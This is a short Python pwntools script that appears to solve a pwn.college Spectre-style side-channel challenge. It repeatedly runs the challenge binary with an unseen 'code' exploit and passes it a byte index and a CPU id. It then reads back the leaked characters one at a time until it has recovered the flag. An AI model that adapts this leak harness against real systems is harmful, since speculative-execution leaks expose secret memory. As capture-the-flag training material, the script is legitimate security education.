from pwn import *
import string
context(os='linux', arch='amd64')
flag='pwn.college{'
idx=len(flag)
s=string.ascii_letters+string.digits+"{}_.-"
cnt=0
while True:
    while True:
        with process(["/challenge/babyarch_babyspectre5","code"]) as p:
            p.recvuntil("Pinning processes to CPU ",drop=True)
            cpuid=int(p.recvuntil("\n",drop=True))
            with open('c','wb') as f:
                f.write(p8(idx)+p8(cpuid))
            p.recvuntil("Answer is:")
            res=int(p.recvuntil(":",drop=True))
            print(res)
            if res!=-1 and chr(res) in s:
                break
    flag+=chr(res)
    print(flag)
    if flag[-1]=='}':
        break
    idx+=1
    
